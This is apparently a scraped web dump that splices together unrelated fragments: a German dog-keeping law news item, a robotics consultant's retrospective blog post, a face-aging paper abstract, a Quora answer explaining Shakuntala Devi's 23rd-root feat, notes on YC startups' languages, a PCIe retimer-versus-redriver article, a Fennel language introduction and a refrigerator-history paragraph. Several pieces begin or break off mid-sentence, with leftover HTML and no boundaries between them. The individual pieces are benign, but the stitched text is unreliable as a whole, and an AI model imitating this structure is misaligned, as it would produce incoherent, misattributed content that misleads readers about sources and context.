scientific knowledge about the needs of dogs” as a justification for the stricter rules. Accordingly, animals should be given “a sufficient degree of movement and contact with environmental stimuli.” Federal Agriculture Minister Julia Klöckner said, “<a href="https://www.iamexpat.de/lifestyle/pets-information-germany">Pets</a> are not cuddly toys.”</p><p>When asked how the new laws will be enforced, especially for private dog owners, a spokesperson for the Agriculture Ministry said that the federal states would be responsible - but that they certainly wouldn’t be ringing the doorbell of every dog owner to check up on them. The law is primarily targeting those who keep their dogs outside in kennels. The draft now needs to be coordinated with the 16 federal states and professional associations.&nbsp;</p>

            </p>
        
      
      <p>It’s that time of year again when I’m thinking back on the journey I set up for myself by deciding to go into Robotics Consulting. This article is a follow up to the blog post I wrote <a href="https://msadowski.github.io/one-year-of-robotics-consulting/">last year</a>. This year, I’ve decided to try and cover the most important aspects of what I’m doing, and how it has been working out for me.</p>

<!-- more -->

<h2 id="the-work-i-had">The work I had</h2>

<p>I’m very grateful for the kind of work that I do - it feels amazing doing what I love and getting paid for it. I would never change my work for anything else. Every single one of my clients has an interesting problem to solve, and I’m yet to get my first negative experience working with someone. Looking back on all my clients, I’ve worked with many interesting people all around the world, mostly helping them to develop software for mobile robots and drones.</p>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/clients.png" alt="Map with 22 Clients I had all over the world">
    <figcaption>A world map of the 22 clients I've worked with over the past 2 years</figcaption>
</figure>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/clients_europe.png" alt="Image showing 8 of my clients in Europe">
    <figcaption>My European clients</figcaption>
</figure>

<p>The duration of the projects I take on are between half a day and 2.5 years long. Everything depends on the client and what they require. Most of my projects kick off with a consultation - helping the client to solve a particular problem by sharing my expertise and experience. After this initial phase, some of the clients decide to hire me as a contractor, helping their technical team solve the challenges they face, while others are happy to carry on working by themselves with the advice received.</p>

<p>As a tangent to the consultations, I also help evaluate robotics funding proposals, as a reviewer in EU technological funding projects <a href="http://www.esmera-project.eu/welcome/">ESMERA</a> and <a href="https://trinityrobotics.eu/">TRINITY</a>, making sure your tax euros are spent on truly cutting-edge projects.</p>

<h3 id="putting-myself-in-my-clients-shoes">Putting myself in my clients’ shoes</h3>

<p>Every project I take on, I treat as my own. This results in me trying to solve issues before they happen, and sometimes even pushing back on client’s decisions - “How about we don’t remove this safety feature?”. Another side effect of treating the project as my own is that I put the client first, before my own business interest, meaning I might earn less for the project overall.</p>

<p>As an example, I was hired to test the idea a client had for a robotic project. The idea turned out to be borderline feasible, with currently available technology, but potentially requiring lots of R&amp;D work. If I sold the project as “no problem, it’s totally doable”, I would definitely get more work supporting the R&amp;D work required. By putting the project and client’s interests first, however, we finished the project after the feasibility study, having realised the extent of R&amp;D work needed.</p>

<p>Since terminating such a project before going to an R&amp;D phase is something I would do, I’m content and the client is most likely even more so, since they don’t have to spend lots of money, not understanding the R&amp;D effort required. Instead, they can decide whether to pursue the idea further. If the client does decide to take a risk, they know that I’ll be there, ready to treat their project as my own, and providing honest advice, even if it means I get less work from it.</p>

<h3 id="the-hardware">The hardware</h3>

<p>Working with hardware is one of the most enjoyable parts of my job. This year, I’ve been focusing a lot on RTK solutions (I have one blog post in the works on a neat RTK setup). Also this year, I finally got my hands on a multi-plane LiDAR, something I’ve been very keen on ever since Velodyne revealed their first multi-plane units.</p>

    <figcaption> Some of the hardware I've worked with since I started working as a Remote Robotics Consultant</figcaption>
</figure>

<h2 id="the-work-i-did-not-win">The Work I Did Not Win</h2>

<h3 id="the-dream-project">The dream project</h3>

<p>At one point, I was approached by a client who wanted to create a certain type of robot that I’ve always dreamt of working with. The task would require me to liaise with manufacturers and developers to get the robot ready, and enable support for autonomous navigation in various terrain types. In short, a hugely challenging project that would immensely help me grow, whilst being super fun at the same time. When discussing the project in more detail, I noticed that the budget for this client was not an issue - any platform for any price was OK, as long as it met the requirements. However, when asking follow up questions, it became clear that the project target was to equip robots with weapons.</p>

</figcaption>
</figure>

<p>When I was applying to University, I promised myself I would not work on weapons, even if these projects have a virtually unlimited budget. I figured that even if I was to fold my consultancy, I would rather do that than compromise on my values.</p>

<h3 id="the-bargain">The bargain</h3>

<p>In the two years working as a Robotics Consultant, I’ve noticed a pattern: the more a potential client bargains before starting the job, the more bargaining and complaining will follow, resulting in an unpleasant experience for everyone involved. In the same bucket as bargaining clients are the UpWork projects that want you to create a SLAM library from scratch for a fixed price of $50. These days, I tend to reject these types of clients and contracts straight away, saving everyone’s time.</p>

<h3 id="watch-out-for-the-legal-stuff">Watch out for the legal stuff</h3>

<p>If I’m receiving 25 pages of legal documents to review before engaging with a customer, it’s a  potential red flag. I don’t mind reading legal documents, but I would rather not involve a lawyer before even starting a project. For me, a huge red flag is when a potential client adds a very vaguely described 3-year non-compete clause, covering a whole industry. I find such terms too restrictive and would never take a project on like this, unless the project also paid for a 3 year holiday after wrapping everything up!</p>

<h3 id="the-lack-of-expertise">The lack of expertise</h3>

<p>As much as I would love to know everything about Robotics, it’s not likely to happen anytime soon. I will never take on projects that fall outside of my expertise (for example, algorithms for soft robotics), unless the client is persistent and understands an R&amp;D process. My go-to advice in such cases is that it’s not feasible to pay my high rates for me to catch up on the topic. In a hypothetical situation, if the project falls outside of my expertise, but it’s in an area I’m planning to pursue, I’d offer a very low rate for the project, highlighting that I will need to do some catching up.</p>

<h2 id="remote-robotics">Remote Robotics</h2>

<p>People often ask me how I work on robotics projects remotely (I’ve been doing this since day 1 of my consultancy). When I’m doing some high level work, it’s usually not an issue. It only becomes slightly more problematic with hardware-oriented projects. The options I’ve tested so far are:</p>

<ul>
  <li>For ROS systems, working with bag files, and in the case of drones, working with log files</li>
  <li>Clients shipping the hardware to me</li>
  <li>Travelling to the client’s location</li>
  <li>Remote control</li>
</ul>

    <figcaption>Me and my partner's office in the time of the COVID-19 pandemic</figcaption>
</figure>

<p>ROS is absolutely the best thing that happened to people like me - I can easily review things online and even develop software with just <a href="http://wiki.ros.org/rosbag">bagfiles</a>. However, it’s not always feasible to work with bags, especially if you need to do some work related to sensors and actuators. In these cases, clients will often ship their hardware to me, so that I can integrate it locally. A very convenient way to work with clients in this way is to use a temporary import - it saves you the risk of paying taxes and duties for the expensive robotics parts, and as far as I know when doing a temporary import, you can keep the items for up to a year.</p>

<p>Travelling to the client’s location usually results in a couple of days of a hackathon solving issue. I love these, as it allows me to put the faces to Slack usernames, and I like the dynamics of these kinds of projects. On the flip side, the last time I did it, I ended up doing about 60 hours of work in 5 days - not very feasible, especially as you need to rest for a couple of days afterwards, but I would do it again!</p>

<p>Remote control of the client’s desktop is something that I try to avoid as much as possible when working with hardware. I find that not having physical access to the components is often very limiting (“can you please unplug the cable for me?”) and I estimate that in the worst cases, you are 20-40% less productive by working on robotics in this way.</p>

<h2 id="other-thoughts-on-consultancy-and-self-employment">Other Thoughts on Consultancy and Self-Employment</h2>

<h3 id="freedom">Freedom</h3>

<p>Freedom is one of the most important aspects of what I do. If I don’t work with hardware for a project, then I can usually work from whatever place I want. If I have a day when I don’t feel like working, or can’t work, then taking a day off is not an issue. To an extent, I can choose whichever projects to work on (or at least to which I can say “no” to).</p>

<figure>
    <img src="https://msadowski.github.io/images/2_yr_consulting/outdoors.jpg" alt="A mountain view">
    <figcaption>Having a possibility to go out into the mountains in the middle of the week is something I appreciate a lot</figcaption>
</figure>

<p>This freedom, however, comes with a price attached to it - if I’m not working, then I’m not making money. I don’t get bank holidays and if I get sick and can’t work, then I’m not earning either. These are the main reasons why I think working for oneself is not for everybody, especially when having no projects lined up, as it can become quite stressful.</p>

<p>Being self-employed means that you are at the centre of your business. For me, this means that my physical and mental health are my number one priorities. Examples of how I exercise these are:</p>
<ul>
  <li>Three times a week, around 4pm, I do sports (normally, I go to the gym, but during the pandemic, I’ve been going for a run)</li>
  <li>Practising meditation as the first thing I do in the morning</li>
  <li>In case of health issues, I look to fix them without thinking twice about the money (being located in Europe is a huge advantage here as I know no doctor’s visit will ruin me, financially)</li>
</ul>

<h3 id="upwork">Upwork</h3>

<p>Over the past year, most of my work has come from Upwork (you can see my profile <a href="https://www.upwork.com/freelancers/~0196b3ccb97605e632">here</a>). I won’t repeat the things I said <a href="https://msadowski.github.io/one-year-of-robotics-consulting/#upwork">last year</a> - I’ve grown to appreciate the service. I realised that the 20% fee for …</p></div></div>

<h2 id="abstract">Abstract</h2>
<p>Existing approaches and datasets for face aging produce results skewed towards the mean, with individual variations and expression wrinkles often invisible or overlooked in favor of global patterns such as the fattening of the face. Moreover, they offer little to no control over the way the faces are aged and can difficultly be scaled to large images, thus preventing their usage in many real-world applications. To address these limitations, we present an approach to change the appearance of a high-resolution image using ethnicity-specific aging information and weak spatial supervision to guide the aging process. We demonstrate the advantage of our proposed method in terms of quality, control, and how it can be used on high-definition images while limiting the computational overhead.</p>

<h2 id="model">Model</h2>
<p>Our model takes a patch <em>p</em> from the input image <em>I</em>, a target aging map <em>A</em>, and two orthonogal gradient images <em>X</em> and <em>Y</em>. The image patch <em>I<sub>p</sub></em> is then transformed according to the local aging information contained in the map <em>A<sub>p</sub></em>, while the orthogonal gradients <em>X<sub>p</sub></em> and <em>Y<sub>p</sub></em> provide the coordinates of the patch in a fully-convolutional manner. The conditions are injected in the generator via the SPADE block to preserve the spatial information. Finally, the generator uses an attention mechanism to only change relevant parts of the image, thus preserving the clothes, earrings and other facial features unrelated to aging.</p>

<h2 id="training">Training</h2>
<p>To train our model, we use four different losses: <em>L<sub>Age</sub></em> to penalize the aging map estimation, <em>L<sub>Loc</sub></em> for the patch localization, <em>L<sub>WGAN</sub></em> for the realism of the generated images, and <em>L<sub>Cyc</sub></em> for the fidelity to the original image.</p>

<p><em>This was originally posted as an answer on Quora to the question “<a href="https://www.quora.com/How-did-Shakuntala-Devi-mentally-calculate-the-23rd-root-of-a-201-digit-number-correctly/answer/Peter-S-Magnusson" target="_blank">How did Shakuntala Devi mentally calculate the 23rd root of a 201-digit number correctly?</a>“.&nbsp;</em></p>
<p><span>Devi was a very talented mental calculator, but by no means the extreme prodigy that she has been made out to be in the media, and she certainly couldn’t take the 23rd root of a number “faster than a computer”.</span></p>
<p>She was an accomplished showman – she grew up traveling with her father and giving performances, and when her father got too old, she travelled by herself and sent money to her family. The modern field of mental calculators generally shies away from words like “prodigy” or “genius”. Mental calculation is obviously related to mathematics, but many of the historically great mental calculators were not particularly knowledgeable in mathematics per se.</p>
<p>By calling her an “accomplished showman”, I don’t mean to denigrate her at all, quite to the contrary. It’s an intricate, and old, art form, dating at least to the 1700s, more akin to the work of an illusionist than that of a professor in mathematics. It takes hard work and dedication to be a good illusionist of any sort. Devi was born, and performed, in a simpler era, one before the internet and computers that have deconstructed much of the “magic” of these artists. And her story in particular – as a poor child traveling in India, earning a living for her family with her demonstrations – holds a deep appeal to us. Especially since, by all accounts I’ve read of those who met her, she was a very special person.</p>
<p>(If you want a demonstration of the “powerful magic” of mental calculation, just search the internet for the tricks involved in solving 3rd roots and 5th roots of large integers in your head. You will astonish your friends and family by just a little effort of rote memorization.)</p>
<p>There are a few things you first have to know about mental calculations of this sort. They are mostly related to memorization and pattern matching, and putting various significant constraints on the problems being asked. If you are not versed in the arts, some tricks that appear very difficult are in fact quite simple. That, after all, is the general art of illusion.</p>
<p>Today, this art form is called “mathemagic”, and notable “mathemagicians” include Martin Gardner, Arthur T Benjamin, Raymond Smullyan, and Persi Diaconis.</p>
<p>Let me take an example from Devi’s life, before I jump into the actual question. Famously, Devi travelled to the US in 1988, including a visit to San Francisco. A Psychology Professor at Berkeley attended one such event, and he published an article about it in 1990 (“Speed of Information Processing in a Calculating Prodigy”, Arthur R. Jensen, INTELLIGENCE 14, 259-274).&nbsp;Jensen describes how he gave two questions to Devi on note cards that he had prepared:<br>
</p>
<blockquote><p>“When I handed Devi two problems, each on a separate card, thinking she would solve first one, then the other, my wife was taken by surprise, as there was hardly time to start the stopwatch, so quick was Devi’s response. Holding the two cards side-by-side, Devi looked at them briefly and said, “The answer to the first is 395 and to the second is 15. Right?” Right, of course! (Her answers were never wrong.) Handing the cards back to me, she requested that I read the problems aloud to the audience. They were: (a) the cube root of 61,629,875 (= 395), and (b) the 7th root of 170,859,375 (= 15). I was rather disappointed that these problems seemed obviously too easy for Devi, as I had hoped they would elicit some sign of mental strain on her part. After all, it had taken me much longer to work them with a calculator”</p></blockquote>
<p><span>Let’s look closely at&nbsp;the first problem, finding the cube root of 61,629,875. The third root of an 8-digit number will have exactly three digits (because it will be between 215 and 464). The third digit is trivial, because a number cubed, modulo 10, only depends on the last digit. In fact, most of the digits are identical – if the last digit of a cube is 1, 4, 5, 6, 9, or 0, then it’s the same in the root; 2 and 8 swap places as do 3 and 7. So we know the last digit is “5”. The first digit is trivial too, in an 8-digit cube it can only be 2, 3, or 4. In this case 61 is close to 64, which is 4 cubed. In fact, it’s very close, so we know the answer will be just below 400, because 400 cubed is 64,000,000. Now, what 3-digit number is just below 400 and ends in 5?</span></p>
<p>That’s why it only took Devi a few seconds to answer. Jensen, a psychologist, doesn’t know the art. Just as it takes a magician to explain what another magician does, it takes an accomplished mental calculator to explain the field to you. What seems amazing (cube root of 61,629,875 in two seconds!) might be straight forward if you know the “trade”.</p>
<p>Though Jensen was not an appropriate judge of these mental feats, he did subject her to a full range of psychological testing, and those are the parts that are valuable reading in his article. Notably, she didn’t score exceptional in any cognitive area, except memory for numbers.</p>
<p>In Devi’s case, we don’t know what techniques&nbsp; she used for this demonstration. Why? Because she never told people. And why would she. She had made a living since kindergarten as a performer. Professional performers don’t reveal their magic. If they do, it’s not magical any more.</p>
<p>But lots of other mental calculators have shared details, many at least on par with Devi’s abilities and several distinctly stronger – people like Wim Klein, Hans Eberstark, Gert Mittring, and Alexis Lemaire, the latter likely the greatest living mental calculator.</p>
<p>Now, let’s get a bit closer to the actual question.</p>
<p>The original story is that in 1977, at the Southern Methodist University in Dallas, Devi extracted the 23rd root of a 201-digit number. As reported at the time (Dallas Morning News, January 26th and later a bit more sensationalized in an editorial on February 6th), the problem was presented to her from a calculation on a Univac 1101 at the Bureau of Standards, and it took the computer over a minute to calculate it, but it took Devi just 50 seconds. Therefore, she had “beaten the computer”, which became the theme of the media coverage and greatly contributed to her fame.</p>
<p>The problem, as posed, was to take the 23rd root of this number:</p>
<p>916, 748, 676, 920, 039, 158, 098, 660, 927, 585, 380, 162, 483, 106, 680, 144, 308, 622, 407, 126, 516, 427, 934, 657, 040, 867, 096, 593, 279, 205, 767, 480, 806, 790, 022, 783, 016, 354, 924, 852, 380, 335, 745, 316, 935, 111, 903, 596, 577, 547, 340, 075, 681, 688, 305, 620, 821, 016, 129, 132, 845, 564, 805, 780, 158, 806, 771</p>
<p>The answer (in case it’s not immediately obvious to you) is 546,372,891.</p>
<p>The first thing to note was that the Univac 1101 and Devi were solving two completely different problems. Raising a nine-digit number to the 23rd power –&nbsp; e.g. multiplying a number by itself 23 times – is a much harder problem than taking the 23rd root – if you know that the result will be an integer.</p>
<p><i>(Parenthetically, the “1101” is probably a typo or some other error. That model is a 1951 vacuum-tube computer that could do about three multiplications per second. Other reports said Univac 1106, or 1108, but that was from 1969 and also a bit old at the time. The “Bureau of Standards” was responsible for running US census data, and thus the principal government progenitor of much of the computer industry. Given the year of 1977, my guess would be that it was actually a Univac 1110, which launched in 1972. Though why anybody would chose a Univac in 1977 is another mystery, since by then IBM had long taken over the industry. But “Univac” was famous and known by readers, after having predicted the Presidential election in 1952 live on television. So it was probably equivalent in people’s minds to “big computer”.)</i></p>
<p>In general, the difficulty lies not in the size of the number (201 digits) or the power (23). It’s the number of digits in the answer. Now, the 23rd root of a 201-digit number will have nine digits. Remember the example above, of a 3rd root that resulted in a 3-digit answer? The beginning and the end are trivial, the middle requires some thought.</p>
<p>The same principle continues to apply to larger powers – except that the notion of “trivial” becomes “quite difficult”, and the notion of “some thought” becomes “that’s really hard”.</p>
<p>In this case, nine digits, the middle two are the hard ones – the first three and the last four are “easy”.</p>
<p>The last four (2891) of the answer is completely determined by the last four (6771) of the cube.</p>
<p>If you want to test that, try raising the number xxx,xx2,891 to the power of 23 – and insert any numbers you want for the “x”:s. In fact, you can take any integer that ends with “2891” and take it to the 23rd power, and the result will end in 6771.</p>
<p>To know what four digits translate to what four digits, there are a bunch of tables you need to memorize, but that’s not as hard as it sounds. For example, the choice of “23” is not a random. Powers of integers where the power is of the form (4n+3) have (simple) patterns for the trailing digits. In particular the last digit is unchanged so you don’t have to remember it at all. Choosing appropriate power (23 in this case) translates to simpler tables to memorize for this step.</p>
<p>Now, look carefully at the first six digits – “916748”. The number “48” is right next to “50”, which means this six-digit number is halfway between “916700” and “916800”. We’ll soon see how this helps.</p>
<p>Let’s start by taking the first four (9167) and factoring it – that’s 89 * 103. Next we apply log tables – at least that’s one of the standard techniques. For this step, I’ll assume Devi has memorized the first 150 or so logs to five decimal digits.</p>
<p>Log (base 10) of each factor is 1.94939 and 2.01284, respectively. Adding the mantissas yield 0.96223. Remember that log(xy) = log(x) + log(y).</p>
<p>Now let’s …</p></div></div>

<p>Note: Ginkgo Bioworks, Boom Supersonic, Grin, Memebox, Helion Energy, North, RelativitySpace, and The Athletic were excluded from the below list; I didn't feel they were primarily software businesses. Feel free to disagree with my judgement.</p>
<p>Note: values current as of August 15, 2020.</p>
<p>Note: if one language was the primary language used to build the initial product, one language is listed above. If it was not clear which language was primary, multiple languages are listed above.</p>
<p>Note: if I couldn't find which language was used to build the startup initially, I referenced the oldest job posting I could find.</p>
<p>Note: valuations are approximate and predominantly sourced from recent articles online. Where I couldn't find an indication of value, ~$150M is assumed; startups listed above were all worth +$150M as of October 2019, as per the <a href="https://www.ycombinator.com/topcompanies/">YC Top Companies</a> page.</p>
<p>Note: "Y" and "N" values in the "DataSci / LowLv" column describe a startup's primary product (i.e. ML startups would have a "Y" for DataSci). It was included to provide additional colour on why initial back-end language(s) may have been used / selected. The values in this column are based entirely on my own judgement. Feel free to disagree with them or ignore them.</p>
<p>Note: Ruby and ruby on rails was a popular choice for YC startups around 2010 - 2012. Anecdotally, ~40% of YC startups used ruby during its peak popularity.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Retimers and redrivers have enabled longer physical channels in servers and storage systems since Peripheral Component Interface Express (PCIe) 3.0 was first introduced almost 10 years ago. Now that PCIe 4.0 is ramping up and PCIe 5.0 is just around the corner, how do these reach extension tools stack up in the face of new challenges in high-speed connectivity?</p>
<p>A redriver is a mostly analog reach extension device designed to boost the high-frequency portions of a signal to counteract the frequency-dependent attenuation caused by the interconnect: the central processing unit (CPU) package, system board, connectors and so on. A redriver’s data path typically includes a continuous time linear equalizer (CTLE), a wideband gain stage and a linear driver. In addition, redrivers often have input loss-of-signal threshold and output receiver (Rx) detection capability. Figure 1 illustrates a typical redriver block diagram.</p>

<p>A retimer is a mixed signal analog/digital device that is protocol-aware and has the ability to fully recover the data, extract the embedded clock and retransmit a fresh copy of the data using a clean clock. In addition to the CTLE and wideband gain stages also found in a redriver, retimers contain a clock and data recovery (CDR) circuit, a decision feedback equalizer (DFE) and a transmit (Tx) finite impulse response (FIR) driver. Finite state machines (FSMs) and/or a microcontroller typically manage the automatic adaptation of the CTLE, wideband gain, DFE and FIR driver, and implement the PCIe link training and status state machine (LTSSM). Figure 2 illustrates a typical retimer block diagram.</p>

<p>In simple terms, a redriver amplifies a signal, whereas a retimer retransmits a fresh copy of the signal. Figure 3 illustrates this and shows how an attenuated eye opening is boosted by a redriver and completely regenerated by a retimer.</p>

<p>The PCIe 4.0 specification took the unprecedented step of formally defining the terms “retimer,” “redriver” and the superset term “repeater,” all of which are types of extension devices or components whose purpose is to extend the physical length of a link. The definitions are:</p>
<ul>
<li><strong>Repeater</strong>: An imprecise term for an extension device [2]. (This term causes confusion … please don’t use it!)</li>
<li><strong>Redriver</strong>: A non-protocol-aware software-transparent extension device [2].</li>
<li><strong>Retimer</strong>: A physical layer protocol-aware, software-transparent extension device that forms two separate electrical link segments [2].</li>
</ul>
<h3>Use Cases for Retimers and Redrivers</h3>
<p>Reach extension devices are necessary whenever the channel – the electrical path between the root complex (RC) and endpoint (EP) – is longer than the PCIe specification allows. The specification defines the maximum channel length in terms of insertion loss at the Nyquist frequency (an informative specification, but easy to validate) and in terms of a reference receiver’s ability to sufficiently equalize and recover the data assuming a worst-case link partner transmitter (a normative specification, but time-consuming to validate).</p>
<p>Suffice it to say, at PCIe 4.0 speeds, reach extension devices are necessary for:</p>
<ul>
<li>Multiconnector topologies.</li>
<li>Cabled topologies.</li>
<li>Single-connector add-in card (AIC) topologies with baseboard channels longer than 9.5 inches.</li>
</ul>
<p>Figure 4 shows an example of a two-connector “riser card” topology, which ordinarily would exceed the PCIe 4.0 loss budget of 28 dB. A redriver or retimer will enable reliable, error-free communication between the RC and EP. But how do you choose which one is the right tool for the job? Well, it helps to know more about the fundamental differences in their capabilities.</p>

<h3>Comparing Retimer and Redriver Capabilities</h3>
<p>Not all redrivers and retimers are the same. There are many distinctions between the two, which are universally true for all PCIe reach extension devices. For example:</p>
<p><strong>Retimers actively participate in the PCIe protocol; redrivers do not.</strong> The PCIe base specification spells out how and to what extent retimers participate in the protocol during Detect, Recovery, L0 and other LTSSM states. Equalization to the L0 and L1 link states requires value-added functionality from the retimer (handshakes, timeouts, bit manipulation, etc.). Redrivers are unaware of and unparticipating in the protocol. If the link works reliably the first time, that’s great! But if the link experiences marginality of any sort, it becomes exceedingly difficult to pinpoint whether the problem is physically before the redriver or after it, since the redriver’s role in link formation is undefined and unknown to its link partners.</p>
<p><strong>Retimers reset the jitter and insertion loss budgets; redrivers do not.</strong> A retimer’s CDR fully recovers the data stream and retransmits it on a clean clock. Starting with a fresh copy of the data enables the extension of the channel to twice the original specification. Without a CDR, the best a redriver can do is attenuate (not reset) the data-dependent jitter (DDJ) caused by intersymbol interference (ISI). A redriver cannot attenuate uncorrelated or random jitter (RJ). In fact, a redriver will always add to RJ due to its own device thermal noise in a root-mean-square (RMS) manner <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>.</p>
<p><strong>Retimers have a DFE; redrivers do not.</strong> A DFE compensates for reflections in the channel response caused by impedance discontinuities in board vias, connectors and package socket-board interfaces. The nice thing about a DFE is that it is unaffected by crosstalk. The DFE equalizes just as well in the presence of crosstalk, and once the data is sampled by the retimer’s CDR, crosstalk is eliminated for good. Redrivers use a CTLE that boosts both the signal and the noise <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>. Crosstalk is not eliminated or even attenuated through a redriver; in fact, it gets amplified.</p>
<p><strong>Retimers automatically adapt their receive and transmit equalizers to match the characteristics of the channel and the link partner’s needs; redrivers do not.</strong> A retimer will examine the signal it receives and adjust the CTLE and DFE to minimize its own bit error rate (BER). Likewise, the retimer’s transmitter will adjust its de-emphasis and pre-shoot equalization to minimize the link partner’s BER according to PCIe equalization protocol. A redriver, conversely, operates with a static equalizer setting. The optimal setting (which can be different for every channel in the system) is often painstakingly selected following an exhaustive search in Input/Output Buffer Information Specification (IBIS) algorithmic modeling interface (AMI) simulations and again in lab testing – a process fondly referred to as “tuning.”</p>
<p><strong>Retimers have built-in features to help diagnose link issues (both electrical and protocol); redrivers do not.</strong> Retimers have tools for assessing the electrical performance (internal eye monitors, pattern generators, pattern checkers) and protocol performance (link state history monitors, timeout adjustments). Redrivers cannot offer such diagnostic features because they are neither protocol-aware nor aware of the actual data passing through. Redrivers do not know what state the link is in.</p>
<p><strong>Retimers correct for lane-to-lane skew; redrivers do not.</strong> PCIe has a tight requirement on the physical skew between lanes on a board (1.6 ns for PCIe 4.0), typically caused by mismatches in channel routing length [3]. Retimers are required to compensate and reset any lane-to-lane skew, effectively doubling the specification budget. Redrivers cannot compensate for lane-to-lane skew, and what’s worse is that they may degrade the skew depending on how symmetric the redriver package is across all lanes.</p>
<p><strong>Retimers can be placed anywhere between two PCIe-compliant channels; redrivers cannot.</strong> By definition, retimers extend the total PCIe channel reach by two times the specification. A redriver’s reach extension, however, depends on where it is placed in the channel – how much loss is before the redriver versus how much is after <a href="https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/serial-bus-white-paper.pdf" target="_blank" rel="noopener noreferrer">[1]</a>. The specific placement of a redriver must be carefully determined by IBIS-AMI simulation and experimentation. Too close to the root complex transmitter, and the redriver’s CTLE will enter nonlinear operation and will have limited benefit. Placed too far from the transmitter, the redriver’s device noise may significantly degrade the signal-to-noise ratio (SNR) of the data signal.</p>
<p>It’s not all bad news for redrivers. They do have lower power consumption and lower input-to-output latency compared to retimers. But if the link does not form in the first place or if the BER is too high, none of that matters!</p>

<h3>Outlook for PCIe 4.0 Systems</h3>
<p>Looking ahead to the upcoming PCIe 4.0 systems, all signs are pointing to an increased need for reach extension devices – and retimers in particular – due to several trends and challenges:</p>
<ul>
<li>CPUs have more PCIe lanes per socket (&gt;100 in some cases [4]) compared to PCIe 3.0. This leads to a greater number of PCIe slots and riser cards, denser routing, and an increased use of multiconnector topologies.</li>
<li>PCIe is shifting from an I/O bus to a multipurpose system interconnect. This means that more servers will be designed to be modular, allowing an array of compute, storage and networking resources to plug in to an increasing number of PCIe slots. This type of open, “plug anything in and it will work” server architecture requires a reach extension solution that is PCIe compliant with plug-and-play interoperability.</li>
<li>The disaggregation of resources such as modular servers, storage trays and accelerator trays is pushing endpoints physically away from CPUs, requiring cables or carrier cards to connect everything together. These longer physical topologies will increasingly need reach …</li></ul></div></div>

</header>
<p>Fennel is a programming language that runs on the Lua runtime.</p>
<h2 id="why-lua">Why Lua?</h2>
<p>The Lua programming language is an excellent and very underrated tool. Is it remarkably powerful yet keeps a very small footprint both conceptually as a language and in terms of the size of its implementation. (The reference implementation consists of about nineteen thousand lines of C and compiles to 278kb.) Partly because it is so simple, Lua is also extremely fast. But the most important thing about Lua is that it’s specifically designed to be put in other programs to make them reprogrammable by the end user.</p>
<p>The conceptual simplicity of Lua stands in stark contrast to other “easy to learn” languages like JavaScript or Python–Lua contains very close to the minimum number of ideas needed to get the job done; only Forth and Scheme offer a comparable simplicity. When you combine this aggressive simplicity with the emphasis on making programs reprogrammable, the result is a powerful antidote to prevailing trends in technology of treating programs as black boxes out of the control of the user.</p>
<h2 id="and-yet">And yet…</h2>
<p>So if Lua is so great, why not just use Lua? In many cases you should! But there are a handful of shortcomings in Lua which over time have shown to be error-prone or unclear. Fennel runs on Lua, and the runtime semantics of Fennel are a subset of Lua’s, but you can think of Fennel as an alternate notation you can use to write Lua programs which helps you avoid common pitfalls. This allows Fennel to focus on doing one thing very well and not get dragged down with things like implementing a virtual machine, a standard library, or profilers and debuggers. Any tool that already works for Lua will work just as well for Fennel.</p>
<p>The most obvious difference between Lua and Fennel is the parens-first syntax; Fennel belongs to the Lisp family of programming languages. You could say that this removes complexity from the grammar; the paren-based syntax is more regular and has fewer edge cases. Simply by virtue of being a lisp, Fennel removes from Lua:</p>
<ul>
<li>statements (everything is an expression),</li>
<li>operator precedence (there is no ambiguity about what comes first), and</li>
<li>early returns (functions always return in tail positions).</li>
</ul>
<h2 id="variables">Variables</h2>
<p>One of the most common legitimate criticisms leveled at Lua is that it makes it easy to accidentally use globals, either by forgetting to add a <code>local</code> declaration or by making a typo. Fennel allows you to use globals in the rare case they are necessary but makes it very difficult to use them by accident.</p>
<p>Fennel also removes the ability to reassign normal locals. If you declare a variable that will be reassigned, you must introduce it with <code>var</code> instead. This encourages cleaner code and makes it obvious at a glance when reassignment is going to happen. Note that Lua 5.4 introduced a similar idea with <code>&lt;const&gt;</code> variables, but since Fennel started from a clean slate it was able to make the cleaner choice be the default rather than opt-in.</p>
<h2 id="tables-and-loops">Tables and Loops</h2>
<p>Lua’s notation for tables (its data structure) feels somewhat dated. It uses curly brackets for both sequential (array-like) and key/value (dictionary-like) tables, while Fennel uses the much more familiar notation of using square brackets for sequential tables and curly brackets for key/value tables.</p>
<p>In addition Lua overloads the <code>for</code> keyword for both numeric “count from X to Y” style loops as well as more generic iterator-based loops. Fennel uses <code>for</code> in the first case and introduces the <code>each</code> form for the latter.</p>
<h2 id="functions">Functions</h2>
<p>Another common criticism of Lua is that it lacks arity checks; that is, if you call a function without enough arguments, it will simply proceed instead of indicating an error. Fennel allows you to write functions that work this way (<code>fn</code>) when it’s needed for speed, but it also lets you write functions which check for the arguments they expect using <code>lambda</code>.</p>
<h2 id="other">Other</h2>
<p>If you’ve been programming in newer languages, you are likely to be spoiled by pervasive destructuring of data structures when binding variables, as well as by pattern matching to write more declarative conditionals. Both these are missing from Lua and included in Fennel.</p>
<p>Finally Fennel includes a macro system so that you can easily extend the language to include new syntactic forms. This feature is intentionally listed last because while lisp programmers have historically made a big deal about how powerful it is, it is relatively rare to encounter situations where such a powerful construct is justified.</p>

					<p>The evolution of the household refrigerator is not a well known story. &nbsp;There seems to be few people interested in the subject. &nbsp;Perhaps it is not as romantic as the development of the automobile. &nbsp;Nonetheless, a concerted effort was put forth in the 1920s and 1930s to produce a cheap, reliable, efficient domestic refrigerator. &nbsp;From books I’m reading on the subject, the great diversity of refrigerator manufacturers in the United States that existed in the 1920s, seems to be boiled down to a handful of companies in the depression era. &nbsp;In the most recent book, “Household Electric Refrigeration” by John F. Wostrel and John G. Praetz 1938; the models described were made by manufacturers, many still around today (or owned by yet larger companies) including General Electric, Frigidaire, Kelvinator, Norge, Grunow, Crosley, Sparton, Hotpoint, Coldspot, Copeland, Ice-O-Matic and Westinghouse.</p>

